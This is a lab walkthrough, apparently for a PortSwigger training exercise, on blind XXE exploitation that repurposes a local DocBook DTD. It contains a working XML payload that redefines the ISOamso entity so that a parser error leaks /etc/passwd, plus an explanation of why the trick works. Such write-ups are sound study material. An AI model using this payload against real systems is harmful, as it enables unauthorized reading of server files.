# [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

> local `docbookx.dtd` exploited by re-declaring `ISOamso`

- open a product page and check for stock
- it will send a request like this

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>3</productId>
    <storeId>1</storeId>
</stockCheck>
```

- send it to repeater and update the xml part like this:

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message
[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "
    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck>
    <productId>3</productId>
    <storeId>1</storeId>
</stockCheck>
```

- send the request

## so what happens

```xml
<!DOCTYPE message
[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "
    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- Declare `local_dtd` (pointer to real DTD) - not loaded yet
- Declare `ISOamso` with your safely-encoded malicious payload - not expanded yet
- Trigger `%local_dtd;` -> loads the real DTD -> real DTD tries to redefine `ISOamso` -> fails (yours already won) -> real DTD's own reference to `%ISOamso;` expands your payload instead, now in a legal external context
- Your payload's `%eval;` and `%error;` fire in sequence, causing a deliberate file-not-found error whose message includes `/etc/passwd`'s contents.
- Burp shows you that error text as the HTTP response.

> The whole thing is really a bootstrapping trick: smuggle your entity in early so it wins the naming conflict, then let it "hitch a ride" inside a legitimate external file's parsing context to bypass restrictions that would otherwise block it.
